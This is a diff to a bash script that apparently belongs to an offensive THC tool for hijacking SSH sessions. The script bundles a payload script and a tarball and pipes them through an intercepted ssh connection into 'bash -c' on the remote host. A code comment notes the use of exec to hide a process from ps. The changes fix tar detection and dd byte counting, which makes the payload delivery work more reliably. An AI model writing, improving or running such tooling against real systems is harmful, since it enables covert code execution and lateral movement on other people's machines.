@@ -20,7 +20,12 @@ mk_package()
 	# This binary package is piped into STDIN once THCINSIDE has been encountered
 	# by ptyspy.
 	FSIZE=$(fsize "${THC_BASEDIR_LOCAL}/x.sh")
-	[[ -z $FSIZE ]] && exit 0
+	[[ -z $FSIZE ]] && ERREXIT 0 "x.sh not found"
+
+	GTAR_BIN="$(command -v gtar)"
+	[[ -z $GTAR_BIN ]] && GTAR_BIN="$(command -v tar)"
+	[[ -z $GTAR_BIN ]] && ERREXIT 0 "tar not found"
+	[[ $($GTAR_BIN --version) = *GNU* ]] || ERREXIT 0 "GNU tar not found"
 
 	# Check if package.2gz needs to be generated again
 	local files
@@ -36,10 +41,7 @@ mk_package()
 		DEBUGF "Creating new ${THC_PACKAGE}..."
 		cat "${THC_BASEDIR_LOCAL}/x.sh" >>"${THC_PACKAGE}"
 		(cd "${THC_BASEDIR_LOCAL}" && \
-			tar cfhz - $files) >>"${THC_PACKAGE}"
-			# OSX --uid=0 --gid=0 --no-mac-metadata
-			# Linux --owner=0 --group=0
-			# tar cfh - --owner=0 --group=0 $files) >>"${THC_PACKAGE}"
+			"${GTAR_BIN}" cfhz - --owner=0 --group=0 $files) >>"${THC_PACKAGE}"
 	else
 		DEBUGF "Using existing ${THC_PACKAGE}..."
 	fi
@@ -72,7 +74,8 @@ if [[ "$1" = "install" ]]; then
 	THC_PACKAGE="${THC_BASEDIR_LOCAL}/package.2gz"
 	mk_package
 
-	cat "${THC_PACKAGE}" | THC_FORCE_UPDATE=1 FSIZE_BIN="${FSIZE_BIN}" THC_TESTING="${THC_TESTING}" THC_DEBUG="${THC_DEBUG}" THC_VERBOSE="${THC_VERBOSE}" THC_DEPTH="${THC_DEPTH}" THC_LOCAL=1 bash -c "$(dd ibs=${FSIZE} count=1 2>/dev/null)" || exit 94
+
+	cat "${THC_PACKAGE}" | THC_FORCE_UPDATE=1 FSIZE_BIN="${FSIZE_BIN}" THC_TESTING="${THC_TESTING}" THC_DEBUG="${THC_DEBUG}" THC_VERBOSE="${THC_VERBOSE}" THC_DEPTH="${THC_DEPTH}" THC_LOCAL=1 bash -c "$(dd ibs=1 count=${FSIZE} 2>/dev/null)" || exit 94
 	exit
 fi
 
@@ -89,9 +92,10 @@ source "${THC_BASEDIR_LOCAL}/depth.cfg" 2>/dev/null
 mk_package
 
 DEBUGF FSIZE=${FSIZE}
+DEBUGF FSIZE_BIN=${FSIZE_BIN}
 # use -T for 'raw' terminal (no pty, no lastlog)
 # NOTE: Use 'exec' to have 1 less process showing up in ps list.
-exec "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "echo THCINSIDE && FSIZE_BIN=\"${FSIZE_BIN}\" THC_TESTING=\"${THC_TESTING}\" THC_DEBUG=\"${THC_DEBUG}\" THC_VERBOSE=\"${THC_VERBOSE}\" THC_DEPTH=\"${THC_DEPTH}\" bash -c \"\$(dd ibs=${FSIZE} count=1 2>/dev/null)\" && echo THCFINISHED"
+exec "${THC_TARGET}" ${THC_SSH_PARAM} -T "${THC_SSH_DEST}" "echo THCINSIDE && FSIZE_BIN=\"${FSIZE_BIN}\" THC_TESTING=\"${THC_TESTING}\" THC_DEBUG=\"${THC_DEBUG}\" THC_VERBOSE=\"${THC_VERBOSE}\" THC_DEPTH=\"${THC_DEPTH}\" bash -c \"\$(dd ibs=1 count=${FSIZE} 2>/dev/null)\" && echo THCFINISHED"
 
 ### NOT REACHED if exec is used above ###
 ### NOT REACHED if exec is used above ###
